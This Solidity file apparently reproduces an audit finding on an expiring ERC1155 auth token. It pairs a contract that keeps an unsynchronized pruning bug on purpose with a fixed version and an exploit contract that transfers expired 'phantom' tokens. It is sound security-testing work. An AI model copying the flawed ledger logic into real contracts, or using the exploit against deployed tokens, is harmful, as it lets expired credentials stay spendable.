// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Radius Technology EVMAuth finding
// 62866: "Expired token groups not synchronized with ERC1155 balance tracking".
//
// EVMAuth1155 maintains TWO independent balance ledgers:
//   1. The authoritative OpenZeppelin-style ERC1155 `_balances` mapping, which
//      is the ledger every transfer/burn is settled against.
//   2. A custom `_group[account][id]` array (Group{balance, expiresAt}) used to
//      track per-record expiration (TTL) for time-limited auth tokens.
//
// The vulnerable `_pruneGroups` (inlined VERBATIM from the finding) removes
// expired records from the custom `_group` ledger and emits an
// `ExpiredTokensBurned` event announcing the removal — but it NEVER calls the
// ERC1155 burn path. The authoritative ERC1155 balance is therefore left
// untouched, so "expired" auth tokens remain fully spendable and transferable.
//
// Exploit (per the finding's Exploit Scenario): Alice holds 100 auth tokens
// with a short TTL. After expiry, `prune` empties her group ledger (group
// balance -> 0) yet her ERC1155 balance is still 100. Alice then transfers 50
// of these already-expired tokens to a sink; the transfer settles against the
// authoritative ERC1155 balance and SUCCEEDS, leaving 50 phantom expired tokens
// in circulation that should have been destroyed.
//
// The negative control (EVMAuth1155Fixed, PR #39 "balance-sync") burns the
// underlying ERC1155 balance inside prune, so the same transfer reverts with
// insufficient balance.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for the OpenZeppelin ERC1155 base. Mirrors the
///      authoritative `_balances` ledger and the `_update` settlement logic of
///      OZ v5 (per-id balance decrement with an insufficient-balance revert).
///      The receiver-acceptance hook and batch arrays are omitted: they are not
///      on the exploit path and are irrelevant to the group/balance desync.
abstract contract ERC1155 {
    mapping(uint256 id => mapping(address account => uint256)) private _balances;
    mapping(address account => mapping(address operator => bool)) private _operatorApprovals;

    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
    error ERC1155MissingApprovalForAll(address operator, address owner);
    error ERC1155InvalidReceiver(address receiver);
    error ERC1155InvalidSender(address sender);

    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);
    event ApprovalForAll(address indexed account, address indexed operator, bool approved);

    function balanceOf(address account, uint256 id) public view virtual returns (uint256) {
        return _balances[id][account];
    }

    function isApprovedForAll(address account, address operator) public view returns (bool) {
        return _operatorApprovals[account][operator];
    }

    function setApprovalForAll(address operator, bool approved) public virtual {
        _operatorApprovals[msg.sender][operator] = approved;
        emit ApprovalForAll(msg.sender, operator, approved);
    }

    function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory) public virtual {
        if (from != msg.sender && !isApprovedForAll(from, msg.sender)) {
            revert ERC1155MissingApprovalForAll(msg.sender, from);
        }
        if (to == address(0)) revert ERC1155InvalidReceiver(address(0));
        _update(from, to, id, value);
    }

    function _update(address from, address to, uint256 id, uint256 value) internal virtual {
        if (from != address(0)) {
            uint256 fromBalance = _balances[id][from];
            if (fromBalance < value) {
                revert ERC1155InsufficientBalance(from, fromBalance, value, id);
            }
            unchecked {
                _balances[id][from] = fromBalance - value;
            }
        }
        if (to != address(0)) {
            _balances[id][to] += value;
        }
        emit TransferSingle(msg.sender, from, to, id, value);
    }

    function _mint(address to, uint256 id, uint256 value) internal {
        if (to == address(0)) revert ERC1155InvalidReceiver(address(0));
        _update(address(0), to, id, value);
    }

    function _burn(address from, uint256 id, uint256 value) internal {
        if (from == address(0)) revert ERC1155InvalidSender(address(0));
        _update(from, address(0), id, value);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: dual tracking with the verbatim buggy `_pruneGroups`.
// ─────────────────────────────────────────────────────────────────────────────
contract EVMAuth1155 is ERC1155 {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    mapping(address => mapping(uint256 => Group[])) internal _group;

    event ExpiredTokensBurned(address indexed account, uint256 indexed id, uint256 amount);

    /// @notice Mint that seeds BOTH the authoritative ERC1155 balance and the
    ///         custom expiration group for the same amount.
    function mintWithExpiry(address to, uint256 id, uint256 amount, uint256 expiresAt) external {
        _mint(to, id, amount);
        _group[to][id].push(Group(amount, expiresAt));
    }

    /// @notice Public entry to the vulnerable pruning routine (also invoked
    ///         automatically during transfers in the real contract).
    function prune(address account, uint256 id) external {
        _pruneGroups(account, id);
    }

    /// @notice Expiration-tracked balance (sum of the custom group records).
    function groupBalanceOf(address account, uint256 id) public view returns (uint256) {
        Group[] storage groups = _group[account][id];
        uint256 total = 0;
        for (uint256 i = 0; i < groups.length; i++) {
            total += groups[i].balance;
        }
        return total;
    }

    // ── VERBATIM vulnerable function from the finding (Figure 2.1) ──
    function _pruneGroups(address account, uint256 id) internal {
        Group[] storage groups = _group[account][id];
        uint256 _now = block.timestamp;
        // Shift valid groups to the front of the array
        uint256 index = 0;
        uint256 expiredAmount = 0;
        for (uint256 i = 0; i < groups.length; i++) {
            bool isValid = groups[i].balance > 0 && groups[i].expiresAt > _now;
            if (isValid) {
                if (i != index) {
                    groups[index] = groups[i];
                }
                index++;
            } else {
                expiredAmount += groups[i].balance;
            }
        }
        // Remove invalid groups from the end of the array
        while (groups.length > index) {
            groups.pop();
        }
        // If any expired groups were removed, emit an event with the total amount of expired tokens
        if (expiredAmount > 0) {
            emit ExpiredTokensBurned(account, id, expiredAmount); // @> removes expired records and emits "burned", but NEVER burns the underlying ERC1155 balance -> phantom balance stays transferable
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (PR #39 "balance-sync"): prune burns the underlying ERC1155
// balance so the two ledgers stay synchronized and expired tokens are destroyed.
// ─────────────────────────────────────────────────────────────────────────────
contract EVMAuth1155Fixed is ERC1155 {
    struct Group {
        uint256 balance;
        uint256 expiresAt;
    }

    mapping(address => mapping(uint256 => Group[])) internal _group;

    event ExpiredTokensBurned(address indexed account, uint256 indexed id, uint256 amount);

    function mintWithExpiry(address to, uint256 id, uint256 amount, uint256 expiresAt) external {
        _mint(to, id, amount);
        _group[to][id].push(Group(amount, expiresAt));
    }

    function prune(address account, uint256 id) external {
        _pruneGroups(account, id);
    }

    function groupBalanceOf(address account, uint256 id) public view returns (uint256) {
        Group[] storage groups = _group[account][id];
        uint256 total = 0;
        for (uint256 i = 0; i < groups.length; i++) {
            total += groups[i].balance;
        }
        return total;
    }

    function _pruneGroups(address account, uint256 id) internal {
        Group[] storage groups = _group[account][id];
        uint256 _now = block.timestamp;
        uint256 index = 0;
        uint256 expiredAmount = 0;
        for (uint256 i = 0; i < groups.length; i++) {
            bool isValid = groups[i].balance > 0 && groups[i].expiresAt > _now;
            if (isValid) {
                if (i != index) {
                    groups[index] = groups[i];
                }
                index++;
            } else {
                expiredAmount += groups[i].balance;
            }
        }
        while (groups.length > index) {
            groups.pop();
        }
        if (expiredAmount > 0) {
            // FIX: burn the underlying ERC1155 balance in lockstep with the group
            // pruning so expired tokens are actually destroyed and non-transferable.
            _burn(account, id, expiredAmount);
            emit ExpiredTokensBurned(account, id, expiredAmount);
        }
    }
}

/// @dev Minimal ERC20 marker double. Records the phantom harm magnitude (the
///      count of expired tokens that remained transferable and reached the sink).
contract MarkerToken {
    string public name = "Expired Auth Phantom Marker";
    string public symbol = "EXPIRED-AUTH";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the Exploit contract plays "Alice", holder of expiring auth
// tokens. It mints already-expired tokens, prunes (desyncing the two ledgers),
// then transfers 50 phantom expired tokens to the SINK — proving expired auth
// tokens remain spendable. The single-block synthetic cannot warp, so the mint
// uses an already-elapsed expiry (expiresAt == block.timestamp), which is the
// exact post-expiry state the finding describes ("after the tokens expire").
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant TOKEN_ID = 1;
    uint256 internal constant MINT_AMOUNT = 100;
    uint256 internal constant TRANSFER_AMOUNT = 50;

    EVMAuth1155 public token; // deploy index 0: the vulnerable contract
    MarkerToken public marker; // deploy index 1: harm-magnitude marker

    // Exposed snapshots for the driver to assert on.
    uint256 public aliceGroupBalanceAfterPrune;
    uint256 public aliceErc1155AfterPrune;
    uint256 public aliceErc1155AfterTransfer;
    uint256 public sinkErc1155AfterTransfer;
    uint256 public phantomTransferred;
    uint256 public sinkMarkerBalance;

    constructor() {
        token = new EVMAuth1155();
        marker = new MarkerToken();
    }

    function tokenAddr() external view returns (address) {
        return address(token);
    }

    function markerAddr() external view returns (address) {
        return address(marker);
    }

    function tokenId() external pure returns (uint256) {
        return TOKEN_ID;
    }

    function run() external payable {
        // The Exploit contract holds the expiring auth tokens (the "Alice" role).
        address alice = address(this);

        // Mint 100 auth tokens that are already at/past their expiry moment
        // (expiresAt == now => `expiresAt > _now` is false => expired).
        token.mintWithExpiry(alice, TOKEN_ID, MINT_AMOUNT, block.timestamp);

        // Prune the expired groups. The custom ledger is emptied and an event
        // claims the tokens were "burned", but the ERC1155 balance is untouched.
        token.prune(alice, TOKEN_ID);

        // DESYNC: expiration tracking now reads 0, ERC1155 (authoritative) reads 100.
        aliceGroupBalanceAfterPrune = token.groupBalanceOf(alice, TOKEN_ID); // 0
        aliceErc1155AfterPrune = token.balanceOf(alice, TOKEN_ID); // 100 (phantom)

        // Alice sells/transfers 50 "expired" tokens to the SINK. The transfer
        // settles against the authoritative ERC1155 balance and SUCCEEDS.
        token.safeTransferFrom(alice, SINK, TOKEN_ID, TRANSFER_AMOUNT, "");

        aliceErc1155AfterTransfer = token.balanceOf(alice, TOKEN_ID); // 50
        sinkErc1155AfterTransfer = token.balanceOf(SINK, TOKEN_ID); // 50 phantom

        // Record the harm magnitude: 50 expired tokens that should have been
        // destroyed now sit at the SINK as a spendable phantom balance.
        phantomTransferred = sinkErc1155AfterTransfer;
        marker.mint(SINK, phantomTransferred);
        sinkMarkerBalance = marker.balanceOf(SINK);

        // Harm: expired tokens remained transferable and 50 units reached the SINK.
        require(sinkErc1155AfterTransfer == TRANSFER_AMOUNT, "phantom transfer failed");
        require(aliceGroupBalanceAfterPrune == 0, "group not pruned");
        require(aliceErc1155AfterPrune == MINT_AMOUNT, "erc1155 balance unexpectedly changed");
    }
}
